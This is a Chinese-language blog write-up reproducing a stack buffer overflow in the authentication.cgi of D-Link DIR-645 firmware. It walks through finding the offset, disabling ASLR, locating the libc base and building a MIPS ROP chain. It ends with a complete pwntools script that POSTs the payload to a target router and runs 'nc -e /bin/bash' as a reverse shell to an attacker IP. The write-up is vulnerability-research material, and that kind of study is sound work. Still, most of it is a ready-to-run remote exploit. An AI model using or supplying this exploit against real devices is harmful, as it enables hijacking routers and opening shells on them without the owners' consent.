DLink-DIR645A 栈溢出漏洞复现
2022-05-01 23:35:21

前言

根据漏洞信息，在authentication.cgi中存在栈溢出漏洞。
固件地址：
ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP

静态分析

可知传入的数据必须为包含 id=xxxx&password=xxxxx

发现存在两处危险：

1.在read处，是根据我们的CONTENT_LENGTH长度来读取数据的，可能造成栈溢出。

2.在strncpy处，对password后面的内容进行处理时，也可能会造成栈溢出。

动态分析

注意：

1.经过动态调试可知，若传入的数据超过1500字节时，程序会崩溃，在strncpy处，若想实现栈溢出，所需要传入的数据要多得多，因此，栈溢出位置在read函数处。

2.若输入的payload形式为

id=xxxxx&password=xxxxxxxxxx


此时覆盖到返回地址的数据与目标数据存在偏移一个的情况。

libc_base+one_gadget = 0x2ab0d8c8


当输入的payload形式为

xid=xxxxx&password=xxxxxxxxxx


则此时可以成功覆盖

编写脚本并结合IDA进行动态调试：

脚本：

#!/bin/bash
INPUT=$(python -c "print 'aid=1234&password='+open('exp','r').read(1102)")
LEN=$(echo -n "$INPUT" | wc -c)
#echo -n 去掉换行符   wc-c 统计字节数
PORT='1234'
echo $INPUT
echo $LEN
cp $(which qemu-mipsel-static) ./qemu
echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="127.0.0.1"  -g $PORT /htdocs/web/authentication.cgi
echo "Debug is over!!"
rm -f ./qemu


当长度设置为3000、1500时，程序均异常中断

设置为1200时，程序正常运行。

测试得到偏移为1050

编写exp

使用qemu进行仿真

正常路由环境和 MIPS 虚拟机中为了程序运行速度会取消 canary，地址随机化等保护机制

关闭地址随机化

echo 0 > /proc/sys/kernel/randomize_va_space


通过查看进程获取libc基地址信息

/htdocs/web/authentication.cgi & cat /proc/1106/maps


由图可知，libc基地址为0x2aaf8000

之后通过LIBC中的gadget来构造ROP链

在IDA中使用mipsrop插件寻找合适的gadget以便于执行system函数

首先要找到可以将system的第一个参数写入$a0的gadget

由此可知，可以先对$SP+0x10处的地址存入存入$s5寄存器中，之后通过move指令将地址存入$a0中，这样就可作为第一个参数了。

之后需要事先将system的地址输入$s0寄存器中，之后通过move $t9,$s0 ; jalr $t9 最终实现对system（“xxxx”）的调用

那么，要想将system的地址输入$s0中，同样也需要找到合适的gadget

在authenticationcgi_main（）函数尾部，可以控制多个重要的寄存器

为了避免\x00在执行过程中带来的影响，可以选择对$s0赋值为system函数的地址-1后的数值，以消除0x00的影响。

但之后就需要寻找gadget来对$s0中的值进行+1处理

同样使用mipsrop插件

mipsrop.find("addiu $s0, .*")


可以选取偏移为0x000158C8处的gadget

之后我们就可以根据上面获取的函数以及gadget的偏移来对要输入的payload进行布局。

栈环境为：
buffer
$s0-$s7
$fp
$ra


EXP：

#!/usr/bin/python2
#encoding:utf-8
from pwn import *
import sys
import requests
context.log_level='debug'
context.arch = "mips"
context.endian = "little"
libc = ELF("./lib/libc.so.0")
sys_addr = libc.symbols['system']
log.success("system address: 0x%x" % sys_addr)
base_addr = 0x2aaf8000
sys_addr = sys_addr-1
call_system_offset = 0x00016824 #command ->$a0 ; jalr $s0;
add_system_offset = 0x000158c8    #add $s0+1 ; jalr $s5;
offset = 1050
command = 'nc -e /bin/bash 192.168.0.6 2222'    #反弹shell
payload = 'A'*(1050 - 36) #ADD BUFFER
payload = payload + p32(base_addr+sys_addr)                  #s0
payload = payload + 'aaaa'                         #s1
payload = payload + 'aaaa'                         #s2
payload = payload + 'aaaa'                         #s3
payload = payload + 'aaaa'                         #s4
payload = payload + p32(base_addr+call_system_offset)          #s5
payload = payload + 'aaaa'                         #s6
payload = payload + 'aaaa'                         #s7
payload = payload + 'aaaa'                         #fp
payload = payload + p32(base_addr+add_system_offset) #ra
'''
由于流水线效应，在跳转执行$ra中保存的地址时会同时执行addiu   $sp, 0x4E8，故在执行
addiu   $s5, $sp, 0x15C+var_14C 时，$sp中保存的地址就已经进行了+0x4E8的操作了
故此时$sp+0x10 = 存储$ra寄存器值的栈地址+0x10
'''
payload = payload + 'a'*0x10                       #addiu   $s5, $sp, 0x15C+var_14C  此时$sp+0x10 = 存储$ra寄存器值的栈地址+0x10
payload = payload + str(command)
print(len(payload))
f = open("exp", 'wb+')
f.write(payload)
f.close()
header = {
    'Cookie': 'uid=aaaa',
    'Accept-Encoding': 'gzip,deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent'  : 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)'
}
ip_port = sys.argv[1]
data = 'aid=aaaa&password='+str(payload)
print len(data)
url = "http://"+ip_port+"/authentication.cgi"
recv=requests.post(url=url,headers=header,data=data)
#recv=requests.get(url=url,headers=header)
print(recv.text)
